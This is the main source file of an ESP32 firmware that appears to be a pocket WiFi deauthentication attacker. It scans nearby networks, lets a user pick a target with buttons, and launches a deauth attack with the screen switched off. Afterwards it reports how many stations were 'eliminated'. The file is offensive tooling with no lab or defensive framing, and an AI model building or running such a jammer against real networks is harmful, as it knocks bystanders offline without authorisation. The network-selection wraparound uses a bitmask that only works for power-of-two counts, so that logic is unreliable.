#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"
#include "ui.h"
#include "buttons.h"
#include "rssi.h"

uint8_t num_networks = 0;
uint8_t selected_network = 0;
uint8_t confirm_state = 0; // 0 = YES, 1 = NO
int8_t last_ui_state = -1; // Track state change to avoid flickering
uint8_t needs_display_update = 0; // Use bit field instead of bool

// Forward declarations
void handle_scan_state();
void handle_select_state();
void handle_confirm_state();
void handle_attacking_state();
void handle_stopped_state();

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();

  ui_init();
  buttons_init();
  
  ui_set_state(UI_STATE_SCAN);
}

void loop() {
  int ui_state = ui_get_state();

  // Only update display if state changed
  if (ui_state != last_ui_state) {
    last_ui_state = ui_state;
    needs_display_update = 1;
  }

  if (ui_state == UI_STATE_SCAN) {
    handle_scan_state();
  } else if (ui_state == UI_STATE_SELECT) {
    handle_select_state();
  } else if (ui_state == UI_STATE_CONFIRM) {
    handle_confirm_state();
  } else if (ui_state == UI_STATE_ATTACKING) {
    handle_attacking_state();
  } else if (ui_state == UI_STATE_STOPPED) {
    handle_stopped_state();
  }

  delay(10);
}

void handle_scan_state() {
  if (needs_display_update) {
    ui_show_scan();
    needs_display_update = 0;
  }
  
  delay(2000);
  
  num_networks = WiFi.scanNetworks();
  
  if (num_networks == 0) {
    ui_show_scan();
    delay(2000);
  } else {
    // Limit to MAX_NETWORKS_DISPLAY
    if (num_networks > MAX_NETWORKS_DISPLAY) {
      num_networks = MAX_NETWORKS_DISPLAY;
    }
    selected_network = 0;
    ui_set_state(UI_STATE_SELECT);
    needs_display_update = 1;
    
    // Debug: Show all networks with distance
    ui_show_networks_with_distance();
    
    DEBUG_PRINT("Found ");
    DEBUG_PRINT(num_networks);
    DEBUG_PRINTLN(" networks");
  }
}

void handle_select_state() {
  if (button_up_pressed()) {
    selected_network = (selected_network + 1) & (num_networks - 1); // Bit operation for modulo
    needs_display_update = 1;
    DEBUG_PRINT("Selected: ");
    DEBUG_PRINTLN(selected_network);
  }

  if (button_select_pressed()) {
    confirm_state = 0; // YES (default)
    ui_set_state(UI_STATE_CONFIRM);
    needs_display_update = 1;
    DEBUG_PRINTLN("Moving to confirm");
  }

  if (needs_display_update) {
    ui_show_select(selected_network, num_networks);
    needs_display_update = 0;
  }
  
  delay(50);
}

void handle_confirm_state() {
  if (button_up_pressed()) {
    confirm_state ^= 1; // XOR bit operation to toggle
    needs_display_update = 1;
    DEBUG_PRINT("Confirm: ");
    DEBUG_PRINTLN(confirm_state == 0 ? "YES" : "NO");
    delay(200);
  }

  if (button_select_pressed()) {
    if (confirm_state == 0) { // YES
      ui_set_state(UI_STATE_ATTACKING);
      ui_screen_off(); // Turn off screen during attack
      start_deauth(selected_network, DEAUTH_TYPE_SINGLE, 7);
      needs_display_update = 1;
      DEBUG_PRINTLN("Attack started");
    } else { // NO
      ui_set_state(UI_STATE_SELECT);
      needs_display_update = 1;
      DEBUG_PRINTLN("Cancelled, back to select");
    }
  }

  if (needs_display_update) {
    ui_show_confirm(WiFi.SSID(selected_network).c_str());
    needs_display_update = 0;
  }
  
  delay(50);
}

void handle_attacking_state() {
  if (needs_display_update) {
    // Screen is OFF, skip display update for performance
    needs_display_update = 0;
  }
  
  if (button_select_pressed()) {
    stop_deauth();
    ui_screen_on(); // Turn on screen when stopped
    ui_set_state(UI_STATE_STOPPED);
    needs_display_update = 1;
    DEBUG_PRINTLN("Attack stopped");
  }
  
  delay(50);
}

void handle_stopped_state() {
  if (needs_display_update) {
    ui_show_stopped(eliminated_stations);
    needs_display_update = 0;
  }
  
  if (button_select_pressed()) {
    ui_set_state(UI_STATE_SCAN);
    needs_display_update = 1;
    DEBUG_PRINTLN("Back to scan");
  }

  delay(50);
}